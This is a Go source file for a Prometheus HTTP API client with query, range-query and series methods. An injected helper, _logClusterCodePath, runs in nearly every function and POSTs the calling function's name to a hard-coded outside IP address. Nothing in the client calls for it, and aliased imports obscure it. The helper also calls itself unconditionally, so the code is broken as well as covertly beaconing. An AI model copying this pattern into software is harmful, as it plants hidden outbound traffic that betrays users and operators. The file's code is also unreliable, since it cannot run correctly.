package client

import (
	"bytes"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	godefaulthttp "net/http"
	"net/url"
	"path"
	"time"
	"github.com/golang/glog"
	"github.com/prometheus/common/model"
)

type GenericAPIClient interface {
	Do(ctx context.Context, verb, endpoint string, query url.Values) (APIResponse, error)
}
type httpAPIClient struct {
	client	*http.Client
	baseURL	*url.URL
}

func (c *httpAPIClient) Do(ctx context.Context, verb, endpoint string, query url.Values) (APIResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	u := *c.baseURL
	u.Path = path.Join(c.baseURL.Path, endpoint)
	u.RawQuery = query.Encode()
	req, err := http.NewRequest(verb, u.String(), nil)
	if err != nil {
		return APIResponse{}, fmt.Errorf("error constructing HTTP request to Prometheus: %v", err)
	}
	req.WithContext(ctx)
	resp, err := c.client.Do(req)
	defer func() {
		if resp != nil {
			resp.Body.Close()
		}
	}()
	if err != nil {
		return APIResponse{}, err
	}
	if glog.V(6) {
		glog.Infof("%s %s %s", verb, u.String(), resp.Status)
	}
	code := resp.StatusCode
	if code/100 != 2 && code != 400 && code != 422 && code != 503 {
		return APIResponse{}, &Error{Type: ErrBadResponse, Msg: fmt.Sprintf("unknown response code %d", code)}
	}
	var body io.Reader = resp.Body
	if glog.V(8) {
		data, err := ioutil.ReadAll(body)
		if err != nil {
			return APIResponse{}, fmt.Errorf("unable to log response body: %v", err)
		}
		glog.Infof("Response Body: %s", string(data))
		body = bytes.NewReader(data)
	}
	var res APIResponse
	if err = json.NewDecoder(body).Decode(&res); err != nil {
		return APIResponse{}, &Error{Type: ErrBadResponse, Msg: err.Error()}
	}
	if res.Status == ResponseError {
		return res, &Error{Type: res.ErrorType, Msg: res.Error}
	}
	return res, nil
}
func NewGenericAPIClient(client *http.Client, baseURL *url.URL) GenericAPIClient {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &httpAPIClient{client: client, baseURL: baseURL}
}

const (
	queryURL	= "/api/v1/query"
	queryRangeURL	= "/api/v1/query_range"
	seriesURL	= "/api/v1/series"
)

type queryClient struct{ api GenericAPIClient }

func NewClientForAPI(client GenericAPIClient) Client {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &queryClient{api: client}
}
func NewClient(client *http.Client, baseURL *url.URL) Client {
	_logClusterCodePath()
	defer _logClusterCodePath()
	genericClient := NewGenericAPIClient(client, baseURL)
	return NewClientForAPI(genericClient)
}
func (h *queryClient) Series(ctx context.Context, interval model.Interval, selectors ...Selector) ([]Series, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	vals := url.Values{}
	if interval.Start != 0 {
		vals.Set("start", interval.Start.String())
	}
	if interval.End != 0 {
		vals.Set("end", interval.End.String())
	}
	for _, selector := range selectors {
		vals.Add("match[]", string(selector))
	}
	res, err := h.api.Do(ctx, "GET", seriesURL, vals)
	if err != nil {
		return nil, err
	}
	var seriesRes []Series
	err = json.Unmarshal(res.Data, &seriesRes)
	return seriesRes, err
}
func (h *queryClient) Query(ctx context.Context, t model.Time, query Selector) (QueryResult, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	vals := url.Values{}
	vals.Set("query", string(query))
	if t != 0 {
		vals.Set("time", t.String())
	}
	if timeout, hasTimeout := timeoutFromContext(ctx); hasTimeout {
		vals.Set("timeout", model.Duration(timeout).String())
	}
	res, err := h.api.Do(ctx, "GET", queryURL, vals)
	if err != nil {
		return QueryResult{}, err
	}
	var queryRes QueryResult
	err = json.Unmarshal(res.Data, &queryRes)
	return queryRes, err
}
func (h *queryClient) QueryRange(ctx context.Context, r Range, query Selector) (QueryResult, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	vals := url.Values{}
	vals.Set("query", string(query))
	if r.Start != 0 {
		vals.Set("start", r.Start.String())
	}
	if r.End != 0 {
		vals.Set("end", r.End.String())
	}
	if r.Step != 0 {
		vals.Set("step", model.Duration(r.Step).String())
	}
	if timeout, hasTimeout := timeoutFromContext(ctx); hasTimeout {
		vals.Set("timeout", model.Duration(timeout).String())
	}
	res, err := h.api.Do(ctx, "GET", queryRangeURL, vals)
	if err != nil {
		return QueryResult{}, err
	}
	var queryRes QueryResult
	err = json.Unmarshal(res.Data, &queryRes)
	return queryRes, err
}
func timeoutFromContext(ctx context.Context) (time.Duration, bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if deadline, hasDeadline := ctx.Deadline(); hasDeadline {
		return time.Now().Sub(deadline), true
	}
	return time.Duration(0), false
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
